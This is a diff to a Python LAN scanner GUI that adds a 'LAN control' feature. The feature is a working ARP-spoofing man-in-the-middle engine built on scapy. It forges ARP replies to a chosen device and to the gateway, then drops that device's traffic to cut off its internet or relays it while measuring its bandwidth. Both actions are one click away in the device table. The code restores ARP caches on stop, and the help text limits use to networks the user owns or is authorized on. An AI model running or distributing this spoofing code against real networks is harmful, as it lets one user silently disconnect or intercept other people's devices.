@@ -4,6 +4,8 @@
 """
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
+import time
+import threading
 import json
 import socket
 import subprocess
@@ -157,14 +159,24 @@ def resource_path(rel):
 class LANScannerApp:
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("局域网设备扫描器 v1.3")
-        self.root.geometry("1100x640")
+        self.root.title("局域网设备扫描器 v1.4 (含局域网管控)")
+        self.root.geometry("1280x660")
         self.root.configure(bg="#c0c0c0")
 
         self.devices = []
         self.online_ips = set()
         self.subnet_prefix = ""
         self.local_conn = self.detect_local_connection()
+
+        # ── 管控(中间人)相关状态 ──
+        self.gateway = ""          # 网关 IP
+        self.gateway_mac = ""      # 网关 MAC
+        self.local_mac = ""        # 本机 MAC
+        self.iface = None          # scapy 使用的网卡
+        self.scapy = None          # 延迟导入的 scapy 模块
+        self.mitm = {}             # ip -> {stop, block, up, down, thread...}
+        self.tree_items = {}       # ip -> 当前 Treeview 行 id（供刷新流量用）
+        self._speed_timer = None
 
         try:
             self.root.iconbitmap(resource_path("app.ico"))
@@ -175,6 +187,8 @@ class LANScannerApp:
         self.setup_ui()
         self.load_devices()
         self.auto_detect_subnet()
+        self.detect_gateway()
+        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
 
     # ---------- 复古风格 ----------
     def setup_style(self):
@@ -236,6 +250,7 @@ class LANScannerApp:
         ttk.Checkbutton(ctrl_frame, text="扫描端口", variable=self.scan_ports_var).pack(side=tk.LEFT, padx=4)
 
         ttk.Button(ctrl_frame, text="开始扫描", command=self.start_scan_thread).pack(side=tk.RIGHT)
+        ttk.Button(ctrl_frame, text="⛔ 停止全部管控", command=self.stop_all_mitm).pack(side=tk.RIGHT, padx=4)
 
         # 搜索过滤框
         search_frame = ttk.Frame(main_frame)
@@ -250,14 +265,19 @@ class LANScannerApp:
         tree_frame = ttk.Frame(main_frame)
         tree_frame.pack(fill=tk.BOTH, expand=True)
 
-        columns = ("ip", "mac", "vendor", "name", "ports", "last_seen", "note")
+        columns = ("ip", "mac", "vendor", "name", "ports", "last_seen", "note", "ctrl", "speed")
         self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", height=18, selectmode="extended")
-        widths = {"ip": 120, "mac": 140, "vendor": 100, "name": 120, "ports": 180, "last_seen": 140, "note": 140}
+        widths = {"ip": 120, "mac": 140, "vendor": 100, "name": 110, "ports": 170,
+                  "last_seen": 130, "note": 110, "ctrl": 110, "speed": 130}
         anchors = {"ip": tk.CENTER, "mac": tk.CENTER, "vendor": tk.CENTER,
-                   "name": tk.W, "ports": tk.W, "last_seen": tk.CENTER, "note": tk.W}
+                   "name": tk.W, "ports": tk.W, "last_seen": tk.CENTER, "note": tk.W,
+                   "ctrl": tk.CENTER, "speed": tk.CENTER}
         for col in columns:
             self.tree.heading(col, text=col.upper(), command=lambda c=col: self.sort_treeview(c))
             self.tree.column(col, width=widths[col], anchor=anchors[col])
+
+        # 点击"管控"列 = 一键开/关禁止上网
+        self.tree.bind("<Button-1>", self.on_tree_click)
 
         self.tree.tag_configure("online", foreground="#1a7f37")
         self.tree.tag_configure("offline", foreground="#999999")
@@ -273,6 +293,8 @@ class LANScannerApp:
         # 右键菜单
         self.context_menu = tk.Menu(self.root, tearoff=0, bg="#c0c0c0")
         self.context_menu.add_command(label="编辑名称 / 备注", command=self.edit_selected)
+        self.context_menu.add_command(label="禁止上网 / 恢复", command=self.toggle_block_selected)
+        self.context_menu.add_command(label="观测网速 / 停止", command=self.toggle_monitor_selected)
         self.context_menu.add_command(label="删除设备", command=self.delete_selected)
         self.context_menu.add_separator()
         self.context_menu.add_command(label="清空列表", command=self.clear_all)
@@ -322,6 +344,29 @@ class LANScannerApp:
             self.subnet_var.set(self.subnet_prefix)
         except Exception as e:
             print(f"自动检测子网失败: {e}")
+
+    # ---------- 网关 / MAC 检测 ----------
+    def detect_gateway(self):
+        """检测默认网关 IP（用于中间人管控）。"""
+        try:
+            if platform.system() == "Windows":
+                out = subprocess.run(["route", "print", "0.0.0.0"],
+                                     capture_output=True, text=True, timeout=10).stdout
+                for line in out.splitlines():
+                    parts = line.split()
+                    if len(parts) >= 3 and re.match(r'^\d+\.\d+\.\d+\.\d+$', parts[0]) \
+                            and parts[0] == "0.0.0.0":
+                        self.gateway = parts[2]
+                        break
+            else:
+                out = subprocess.run(["ip", "route", "show", "default"],
+                                     capture_output=True, text=True, timeout=10).stdout
+                m = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", out)
+                if m:
+                    self.gateway = m.group(1)
+        except Exception as e:
+            print("网关检测失败:", e)
+        self.status_var.set(f"网关: {self.gateway or '未知'} | 本机: {self.local_conn}")
 
     # ---------- 扫描 ----------
     def start_scan_thread(self):
@@ -461,6 +506,7 @@ class LANScannerApp:
     def update_treeview(self):
         for item in self.tree.get_children():
             self.tree.delete(item)
+        self.tree_items = {}
 
         keyword = self.search_var.get().strip().lower()
         if keyword:
@@ -485,11 +531,20 @@ class LANScannerApp:
                 ports_disp = ""
             vendor = lookup_oui(dev.get("mac", ""))
             tag = "online" if dev["ip"] in self.online_ips else "offline"
-            self.tree.insert("", tk.END,
-                             values=(dev["ip"], dev.get("mac", ""), vendor,
+            ip = dev["ip"]
+            st = self.mitm.get(ip)
+            if st:
+                ctrl_disp = "■ 已禁网" if st["block"] else "● 测速中"
+            else:
+                ctrl_disp = "○ 允许"
+            speed_disp = self._fmt_speed(st["up"], st["down"]) if st else ""
+            item = self.tree.insert("", tk.END,
+                             values=(ip, dev.get("mac", ""), vendor,
                                      dev.get("name", ""), ports_disp,
-                                     dev.get("last_seen", ""), dev.get("note", "")),
+                                     dev.get("last_seen", ""), dev.get("note", ""),
+                                     ctrl_disp, speed_disp),
                              tags=(tag,))
+            self.tree_items[ip] = item
 
         self.status_var.set(
             f"共 {len(self.devices)} 台 | 显示 {len(filtered)} 台 | 在线 {len(self.online_ips)} 台 | 本机: {self.local_conn}")
@@ -630,19 +685,279 @@ class LANScannerApp:
         except Exception as e:
             messagebox.showerror("导出失败", str(e))
 
+    # ================= 局域网管控引擎 (ARP 中间人) =================
+    # 说明：普通电脑不是路由器，无法真正"路由拦截"。本工具通过 ARP 欺骗
+    # 让自己成为目标与网关之间的中转（中间人）来实现：
+    #   - 禁止上网：欺骗后丢弃目标发往外网的包 → 断网
+    #   - 观测网速：欺骗后正常转发，统计上行/下行字节
+    # 关闭开关会立刻停止欺骗并还原双方 ARP。仅限自己/授权网络使用。
+    def ensure_scapy(self):
+        """延迟导入 scapy，并检查管理员权限。"""
+        if self.scapy is not None:
+            return True
+        if platform.system() == "Windows":
+            try:
+                import ctypes
+                if not ctypes.windll.shell32.IsUserAnAdmin():
+                    messagebox.showerror(
+                        "需要管理员权限",
+                        "管控(中间人)功能必须以管理员身份运行本程序。\n"
+                        "请右键『以管理员身份运行』lan_scanner.exe 后重试。")
+                    return False
+            except Exception:
+                pass
+        try:
+            import scapy.all as scapy_mod
+            self.scapy = scapy_mod
+            self.iface = scapy_mod.conf.iface
+            self.local_mac = scapy_mod.get_if_hwaddr(self.iface) if self.iface else ""
+            return True
+        except Exception as e:
+            messagebox.showerror(
+                "缺少 scapy / Npcap",
+                "管控功能需要安装 scapy 与 Npcap。\n"
+                "请在命令行执行: pip install scapy\n"
+                "并到 https://npcap.com 安装 Npcap（勾选 WinPcap 兼容模式）。\n"
+                f"错误: {e}")
+            return False
+
+    def _local_ip(self):
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+        except Exception:
+            return ""
+        finally:
+            s.close()
+
+    def get_mac(self, ip):
+        if not self.ensure_scapy():
+            return None
+        scapy = self.scapy
+        try:
+            ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
+                               scapy.ARP(pdst=ip), timeout=2, verbose=0, iface=self.iface)
+            for _, r in ans:
+                return r[scapy.Ether].src
+        except Exception as e:
+            print("解析 MAC 失败:", e)
+        return None
+
+    def start_mitm(self, ip, block=True):
+        if ip in self.mitm:
+            return
+        if ip == self.gateway or ip == self._local_ip() or ip == "":
+            messagebox.showwarning("提示", "不能对本机或网关执行管控。")
+            return
+        if not self.ensure_scapy():
+            return
+        if not self.gateway:
+            messagebox.showwarning("无网关", "未检测到默认网关，无法进行管控。")
+            return
+        if not self.gateway_mac:
+            self.gateway_mac = self.get_mac(self.gateway)
+        tmac = self.get_mac(ip)
+        if not self.gateway_mac or not tmac:
+            messagebox.showerror("解析失败", f"无法解析 {ip} 或网关的 MAC 地址，请先扫描到该设备。")
+            return
+        state = {"ip": ip, "tmac": tmac, "block": block,
+                 "stop": threading.Event(), "up": 0, "down": 0,
+                 "last": time.time(), "threads": []}
+        self.mitm[ip] = state
+        t1 = threading.Thread(target=self._spoof_loop, args=(state,), daemon=True)
+        t2 = threading.Thread(target=self._sniff_loop, args=(state,), daemon=True)
+        t1.start()
+        t2.start()
+        state["threads"] = [t1, t2]
+        self.update_treeview()
+        self.status_var.set(f"{'禁止上网' if block else '观测网速'} 已对 {ip} 启动（中间人模式）")
+        self._start_speed_timer()
+
+    def _spoof_loop(self, state):
+        scapy = self.scapy
+        ip, tmac = state["ip"], state["tmac"]
+        gip, gmac, amac = self.gateway, self.gateway_mac, self.local_mac
+        while not state["stop"].is_set():
+            # 骗目标：网关的 MAC = 本机
+            scapy.sendp(scapy.Ether(dst=tmac) /
+                        scapy.ARP(op=2, pdst=ip, psrc=gip, hwdst=tmac, hwsrc=amac),
+                        verbose=0, iface=self.iface)
+            # 骗网关：目标的 MAC = 本机
+            scapy.sendp(scapy.Ether(dst=gmac) /
+                        scapy.ARP(op=2, pdst=gip, psrc=ip, hwdst=gmac, hwsrc=amac),
+                        verbose=0, iface=self.iface)
+            time.sleep(1)
+
+    def _sniff_loop(self, state):
+        scapy = self.scapy
+        ip, tmac = state["ip"], state["tmac"]
+        gmac, amac = self.gateway_mac, self.local_mac
+
+        def handle(pkt):
+            if not pkt.haslayer(scapy.IP):
+                return
+            iph = pkt[scapy.IP]
+            if iph.src == ip:           # 目标 → 外网（上行）
+                state["up"] += len(pkt)
+                if not state["block"] and pkt.haslayer(scapy.Ether):
+                    scapy.sendp(scapy.Ether(src=amac, dst=gmac) / iph,
+                                verbose=0, iface=self.iface)
+            elif iph.dst == ip:         # 外网 → 目标（下行）
+                state["down"] += len(pkt)
+                if not state["block"] and pkt.haslayer(scapy.Ether):
+                    scapy.sendp(scapy.Ether(src=amac, dst=tmac) / iph,
+                                verbose=0, iface=self.iface)
+
+        while not state["stop"].is_set():
+            try:
+                scapy.sniff(filter=f"host {ip}", prn=handle, store=0,
+                            iface=self.iface, timeout=1)
+            except Exception as e:
+                print("sniff error:", e)
+                break
+
+    def _restore_arp(self, state):
+        if not self.scapy:
+            return
+        scapy = self.scapy
+        ip, tmac = state["ip"], state["tmac"]
+        gip, gmac = self.gateway, self.gateway_mac
+        for _ in range(3):
+            # 告诉目标：网关真实 MAC
+            scapy.sendp(scapy.Ether(dst=tmac) /
+                        scapy.ARP(op=2, pdst=ip, psrc=gip, hwdst=tmac, hwsrc=gmac),
+                        verbose=0, iface=self.iface)
+            # 告诉网关：目标真实 MAC
+            scapy.sendp(scapy.Ether(dst=gmac) /
+                        scapy.ARP(op=2, pdst=gip, psrc=ip, hwdst=gmac, hwsrc=tmac),
+                        verbose=0, iface=self.iface)
+            time.sleep(0.1)
+
+    def stop_mitm(self, ip):
+        st = self.mitm.get(ip)
+        if not st:
+            return
+        st["stop"].set()
+        time.sleep(0.2)
+        self._restore_arp(st)
+        self.mitm.pop(ip, None)
+        self.update_treeview()
+
+    def stop_all_mitm(self):
+        for ip in list(self.mitm.keys()):
+            self.stop_mitm(ip)
+        self.status_var.set("已全部停止管控，并还原 ARP 表")
+
+    def _fmt_speed(self, up, down):
+        return f"↑{up/1024:.0f} ↓{down/1024:.0f} KB/s"
+
+    def _start_speed_timer(self):
+        if self._speed_timer:
+            return
+
+        def tick():
+            for ip, st in self.mitm.items():
+                now = time.time()
+                dt = max(now - st["last"], 0.001)
+                up_k = st["up"] / 1024 / dt
+                down_k = st["down"] / 1024 / dt
+                st["up"] = 0
+                st["down"] = 0
+                st["last"] = now
+                item = self.tree_items.get(ip)
+                if item:
+                    self.tree.set(item, "speed", f"↑{up_k:.0f} ↓{down_k:.0f} KB/s")
+            if self.mitm:
+                self._speed_timer = self.root.after(1000, tick)
+            else:
+                self._speed_timer = None
+
+        self._speed_timer = self.root.after(1000, tick)
+
+    def on_tree_click(self, event):
+        region = self.tree.identify("region", event.x, event.y)
+        if region != "cell":
+            return
+        col = self.tree.identify_column(event.x)
+        cols = list(self.tree["columns"])
+        if col != f"#{cols.index('ctrl') + 1}":
+            return
+        item = self.tree.identify_row(event.y)
+        if item:
+            ip = self.tree.set(item, "ip")
+            self.toggle_block(ip)
+
+    def toggle_block(self, ip):
+        if ip in self.mitm:
+            self.stop_mitm(ip)
+            self.status_var.set(f"已恢复 {ip} 上网")
+        else:
+            self.start_mitm(ip, block=True)
+
+    def toggle_monitor(self, ip):
+        if ip in self.mitm:
+            self.stop_mitm(ip)
+            self.status_var.set(f"已停止对 {ip} 的观测")
+        else:
+            self.start_mitm(ip, block=False)
+
+    def toggle_block_selected(self):
+        sel = self.tree.selection()
+        if not sel:
+            messagebox.showinfo("提示", "请先选中一台设备。")
+            return
+        self.toggle_block(self.tree.set(sel[0], "ip"))
+
+    def toggle_monitor_selected(self):
+        sel = self.tree.selection()
+        if not sel:
+            messagebox.showinfo("提示", "请先选中一台设备。")
+            return
+        self.toggle_monitor(self.tree.set(sel[0], "ip"))
+
+    def on_close(self):
+        try:
+            self.stop_all_mitm()
+        except Exception:
+            pass
+        try:
+            if self._speed_timer:
+                self.root.after_cancel(self._speed_timer)
+        except Exception:
+            pass
+        self.root.destroy()
+
     # ---------- 帮助 ----------
     def show_help(self):
         help_text = """
-        📖 使用说明 (v1.3)：
+        📖 使用说明 (v1.4)：
         1. 输入子网前缀（如 192.168.0），点击"开始扫描"
         2. 并发 Ping 探测活跃主机，读取 ARP 表获取 MAC 地址
         3. "厂商"列根据 MAC 前 3 字节(OUI)自动识别设备厂商
         4. 勾选"解析设备名"→反向 DNS获取主机名（无PTR记录则留空）
         5. 勾选"扫描端口"→探测30个常用端口，如 80(HTTP),443(HTTPS)
         6. "最近在线"显示该设备本次被发现的时间
-        7. 状态栏显示【本机连接: WiFi / 有线(以太网)】
+        7. 状态栏显示【本机连接: WiFi / 有线(以太网)】及网关地址
         8. 绿色=在线，灰色=离线/历史；双击或右键可编辑/删除
         9. 支持搜索过滤、保存加载、导出 JSON/CSV
+
+        🛡 局域网管控（新功能）：
+        · "管控"列显示每台设备的状态：○允许 / ■已禁网 / ●测速中
+        · 直接点击该列单元格 = 一键「禁止上网 / 恢复」
+        · 右键菜单也可执行「禁止上网 / 恢复」和「观测网速 / 停止」
+        · "流量"列实时显示该设备的上行/下行 KB/s（仅观测中显示）
+        · 顶部「⛔ 停止全部管控」可一键还原所有被控设备
+        · 关闭程序会自动停止欺骗并还原 ARP 表
+
+        ⚠ 重要前提与警告：
+        · 必须以【管理员身份】运行；需安装 scapy (pip install scapy)
+          和 Npcap（https://npcap.com，安装时勾选 WinPcap 兼容）
+        · 普通电脑不是路由器，本功能采用 ARP 中间人方式实现：
+          开启后目标的上网流量会经过本机。请【仅在你自己拥有/授权的
+          局域网络】内测试使用，并事先取得相关方同意。
+        · 关闭开关或退出程序会立即还原，不会影响网络。
 
         💡 提示：OUI 数据为精简版(~90条常见厂商)，未收录的显示为空。
         端口扫描/反向DNS需一定时间；Linux/macOS读取ARP通常需要root权限。
